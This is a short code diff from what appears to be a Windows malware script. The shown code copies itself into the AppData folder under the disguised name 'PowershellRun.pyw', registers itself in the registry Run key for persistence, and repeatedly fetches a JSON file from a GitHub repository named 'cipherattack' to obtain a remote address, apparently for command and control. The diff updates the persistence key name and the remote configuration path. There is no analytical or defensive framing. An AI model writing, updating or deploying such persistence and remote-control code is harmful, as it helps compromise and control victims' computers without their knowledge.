@@ -77,10 +77,10 @@ if sys.platform == "win32":
     loc = os.environ["appdata"] + "\\PowershellRun.pyw"
     if not os.path.exists(loc):
         shutil.copy(os.path.realpath(__file__),loc)
-        subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V "PowerShellRun" /t REG_SZ /F /D "{loc}"')
+        subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V PowerShellRun /t REG_SZ /F /D "{loc}"')
 while True:
     try:
-        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/host3n").read())
+        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/jotr3n").read())
         if "fine" in [i.lower() for i in data.keys()]:
             addr = list(data.values())[0]
         else:
